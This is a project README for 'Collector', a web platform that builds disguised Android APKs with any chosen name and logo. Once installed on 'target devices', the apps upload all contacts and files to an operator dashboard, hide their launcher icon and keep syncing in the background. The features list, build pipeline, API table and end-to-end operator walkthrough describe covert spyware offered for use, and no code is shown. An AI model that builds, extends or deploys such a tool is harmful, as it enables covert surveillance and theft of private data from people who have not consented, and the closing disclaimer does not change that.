# Collector — Remote Device Data Collection Platform

Collector is a full-stack web application that allows you to build custom Android APKs on-the-fly, deploy them to target devices, and remotely collect contacts and files through a live web dashboard. Built with Next.js 16, React 19, and a server-side Android APK build pipeline.

---

## Features

### APK Builder
- **Custom App Name & Logo** — Set any app name and upload a custom icon when building the APK
- **Server-Side Build** — APK is compiled, aligned, and signed entirely on the server using Android SDK command-line tools
- **One-Click Download** — Built APK is returned instantly as a downloadable file

### Contact Collection
- **Full Contact Access** — Reads all contacts with name, phone number, email, and organization
- **vCard Export** — Download individual or all contacts as `.vcf` vCard files (v3.0 format)
- **Copy & Share** — Copy vCard data to clipboard or share via Web Share API
- **Contact Search** — Search contacts by name, phone, or email
- **Manual Re-Sync** — Trigger contact re-sync from the web dashboard at any time

### File Manager
- **Full File Access** — Reads files from Download, DCIM, Pictures, Documents, Music, Movies, Recordings, and WhatsApp directories
- **Directory Browsing** — Navigate the device file system with a folder tree and breadcrumbs
- **File Preview** — Preview images, videos, audio, PDFs, and documents directly in the browser
- **Single File Download** — Stream and download individual files with proper MIME types
- **Bulk ZIP Download** — Download all files organized by type (Images/, Videos/, Audio/, Documents/, Other/) with per-device subfolders
- **File Deletion** — Delete individual files from both server storage and metadata
- **File Type Filtering** — Filter uploaded files by category (image, video, audio, document, etc.)
- **List/Grid View** — Toggle between list and grid display modes

### Multi-Device Support
- **Unlimited Devices** — Install the same APK on unlimited phones; all devices report to the same session
- **Device Identification** — Each device registers with a unique ID, brand, model, and Android version
- **Device List** — All connected devices displayed in a list with online/offline status indicators
- **Per-Device Filtering** — Filter contacts, files, and file manager by specific device
- **Device Attribution** — Every contact and file is tagged with the device that uploaded it
- **Live Heartbeat** — Each device sends a heartbeat every 30 seconds to maintain live connection status

### Live Status & Monitoring
- **Real-Time Status** — Track device status from APK built → installed → permissions granted → uploading → live connected
- **Online/Offline Detection** — Devices show as online when sending heartbeats within 60 seconds
- **Auto-Refresh** — Dashboard and session views auto-poll for updates every 5-10 seconds
- **Status History** — Full timeline of status changes for each session

### Android App Behavior
- **Permission Request** — On first launch, requests READ_CONTACTS and MANAGE_EXTERNAL_STORAGE permissions
- **Automatic Data Upload** — After permissions are granted, uploads all contacts and file metadata immediately
- **Background File Sync** — Foreground service continuously uploads files from key directories
- **Auto-Hide** — App icon is hidden from the launcher after initial sync is complete
- **Persistent Services** — HeartbeatService and FileUploadService survive app being swiped away

---

## Tech Stack

| Layer | Technology |
|---|---|
| **Framework** | Next.js 16.1.1 (App Router) |
| **Language** | TypeScript, Java (Android) |
| **Frontend** | React 19, Tailwind CSS 4, shadcn/ui |
| **Icons** | Lucide React |
| **Database** | File-based JSON (no SQL/ORM) |
| **Android SDK** | API 34, build-tools 34.0.0, JDK 21, minSdk 24 |
| **APK Signing** | Debug keystore (apksigner) |
| **Deployment** | Vercel (with extended function durations) |

---

## Project Structure

```
collector/
├── app/
│   ├── layout.tsx                  # Root layout with Geist fonts
│   ├── page.tsx                    # Home dashboard — session list
│   ├── globals.css                 # Tailwind + custom styles
│   ├── view/[id]/page.tsx          # Session detail — contacts, files, manager
│   └── api/
│       ├── build-app/route.ts      # POST — build custom APK
│       ├── heartbeat/route.ts      # POST — device heartbeat
│       ├── status/update/route.ts  # POST — status update from device
│       ├── sessions/route.ts       # GET all, DELETE session
│       ├── sessions/[id]/status/route.ts  # GET session status
│       ├── contacts/
│       │   ├── upload/route.ts     # POST — contacts + file metadata
│       │   ├── view/[id]/route.ts  # GET — full session data
│       │   └── sync/route.ts       # POST — trigger re-sync
│       └── files/
│           ├── upload/route.ts     # POST — file upload (multipart)
│           ├── download/[id]/route.ts  # GET — ZIP download
│           ├── browse/route.ts     # GET — directory browsing
│           ├── delete/route.ts     # DELETE — delete file
│           └── file/[fileId]/route.ts  # GET — single file stream
├── android-app/                    # Template Android project
│   ├── app/src/main/
│   │   ├── AndroidManifest.xml
│   │   ├── java/com/contactcollector/app/
│   │   │   ├── MainActivity.java       # Permissions, data read, upload
│   │   │   ├── HeartbeatService.java   # 30s heartbeat service
│   │   │   └── FileUploadService.java  # Background file upload
│   │   └── res/                        # Layouts, strings, drawables
│   └── build/keystore/debug.keystore
├── components/ui/                  # shadcn/ui components
├── hooks/                          # Custom React hooks
├── lib/
│   ├── db.ts                       # File-based JSON database
│   └── utils.ts                    # Utility functions
├── data/                           # Runtime data directory
│   ├── db/sessions/                # Session JSON files
│   └── db/files/                   # Uploaded file metadata
├── package.json
├── next.config.ts
├── tailwind.config.ts
└── vercel.json
```

---

## API Reference

| Method | Endpoint | Description |
|---|---|---|
| `POST` | `/api/build-app` | Build custom APK with name + logo |
| `GET` | `/api/sessions` | List all sessions with online status |
| `DELETE` | `/api/sessions` | Delete a session |
| `GET` | `/api/sessions/[id]/status` | Get session status + device list |
| `POST` | `/api/contacts/upload` | Upload contacts + file metadata from device |
| `GET` | `/api/contacts/view/[id]` | Get full session data (contacts, files, devices) |
| `POST` | `/api/contacts/sync` | Trigger contact re-sync |
| `POST` | `/api/files/upload` | Upload a file (multipart, max 100MB) |
| `GET` | `/api/files/download/[id]` | Download all files as ZIP |
| `GET` | `/api/files/browse` | Browse files by directory path |
| `DELETE` | `/api/files/delete` | Delete a specific file |
| `GET` | `/api/files/file/[fileId]` | Stream/download a single file |
| `POST` | `/api/heartbeat` | Device heartbeat ping |
| `POST` | `/api/status/update` | Update session status from device |

---

## Setup & Installation

### Prerequisites

- **Node.js** 18+ and npm/bun
- **Android SDK** — with `platforms/android-34` and `build-tools/34.0.0`
- **JDK 21** — for compiling Android Java code
- **Linux/Unix environment** — APK build pipeline uses shell commands

### Environment Variables

| Variable | Default | Description |
|---|---|---|
| `DB_DIR` | `db/` | Directory for JSON database files |
| `UPLOAD_DIR` | `/tmp/collector-uploads` | Directory for uploaded files |
| `ANDROID_HOME` | `/home/z/android-sdk` | Android SDK location |
| `JAVAC` | `/tmp/jdk-21.0.11/bin/javac` | JDK javac path |

### Install & Run

```bash
# Clone the repository
git clone https://github.com/fahad-ahamed/collector-final.git
cd collector-final

# Install dependencies
npm install

# Run development server
npm run dev

# Build for production
npm run build
npm start
```

### Android SDK Setup

```bash
# Install Android SDK command-line tools
mkdir -p /home/z/android-sdk
# Download cmdline-tools from https://developer.android.com/studio#command-tools

# Install required components
sdkmanager "platforms;android-34"
sdkmanager "build-tools;34.0.0"

# Install JDK 21
# Download from https://adoptium.net/
```

---

## APK Build Process

The server builds Android APKs entirely from the command line without Gradle:

1. **Copy** template Android project to a temp directory
2. **Inject** custom app name into `strings.xml` and `AndroidManifest.xml`
3. **Inject** server URL (`WEBSITE_BASE_URL`) into `MainActivity.java`
4. **Inject** unique `BUILD_ID` for session matching
5. **Compile resources** with `aapt2 compile`
6. **Link resources** with `aapt2 link`
7. **Compile Java** with `javac` (JDK 21, targeting Java 8)
8. **Convert to DEX** with `d8`
9. **Package** into APK with `zip`
10. **Align** with `zipalign`
11. **Sign** with `apksigner` (debug keystore)
12. **Return** signed APK as download

---

## Data Model

### Session

```typescript
{
  id: string;                    // UUID
  contacts: string;              // JSON array of contacts
  files: string;                 // JSON array of file metadata
  appName: string;               // Custom app name
  count: number;                 // Contact count
  fileCount: number;             // File count
  createdAt: string;             // ISO timestamp
  status?: string;               // Current status
  statusHistory?: StatusEntry[]; // Status change timeline
  lastHeartbeat?: string;        // Last heartbeat timestamp
  buildId?: string;              // Links APK to session
  devices?: Record<string, DeviceInfo>;  // Multi-device map
}
```

### Device Info

```typescript
{
  id: string;              // Unique device ID
  name: string;            // Device display name
  model: string;           // Device model
  brand: string;           // Device brand
  androidVersion: string;  // Android version
  lastHeartbeat?: string;  // Last heartbeat time
  firstSeen: string;       // First connection time
}
```

### Contact

```typescript
{
  id: string;
  name: string;
  phone: string;
  email?: string;
  organization?: string;
  deviceId?: string;       // Uploading device
}
```

### Uploaded File

```typescript
{
  id: string;
  sessionId: string;
  deviceId?: string;       // Uploading device
  filePath: string;        // Original path on device
  fileName: string;        // File name
  fileSize: number;        // Size in bytes
  fileType: string;        // MIME type
  serverPath: string;      // Server storage path
  uploadedAt: string;      // ISO timestamp
}
```

---

## Deployment

### Vercel (Recommended)

The project includes `vercel.json` with extended function durations:

```json
{
  "functions": {
    "app/api/build-app/route.ts": { "maxDuration": 120 },
    "app/api/files/download/[id]/route.ts": { "maxDuration": 120 },
    "app/api/files/upload/route.ts": { "maxDuration": 60 }
  }
}
```

**Note:** Vercel's serverless environment does not support the APK build pipeline. For full functionality, deploy on a VPS or use a custom server.

### VPS / Self-Hosted

```bash
# Build and run
npm run build
npm start

# Or use PM2 for process management
pm2 start npm --name "collector" -- start
```

---

## How It Works — End to End

1. **Operator** opens the web dashboard and enters an app name + logo
2. **Server** builds a custom APK with the name and logo embedded
3. **Operator** downloads the APK and installs it on target device(s)
4. **App** requests permissions, reads contacts and file metadata, uploads to server
5. **App** starts background services for continuous file sync and heartbeats
6. **App** hides its icon from the launcher
7. **Operator** views all collected data in real-time on the web dashboard
8. **Multiple devices** can report to the same session, each identified by name and model
9. **Operator** can browse files, download data, export contacts, and manage sessions

---

## Important Notes

- The APK is signed with a **debug keystore** — not suitable for production Play Store distribution
- There is **no authentication** on the web dashboard — anyone with a session URL has full access
- Data is stored as **plain JSON files** without encryption
- File uploads are limited to **100MB** per file on the server side and **50MB** on the Android client
- Contact sync supports up to **50,000 contacts** per session
- File metadata supports up to **100,000 entries** per session
- The Android app targets **API 34** with a minimum of **API 24** (Android 7.0+)

---

## License

This project is for educational and authorized use only. Use responsibly and in compliance with applicable laws and regulations.
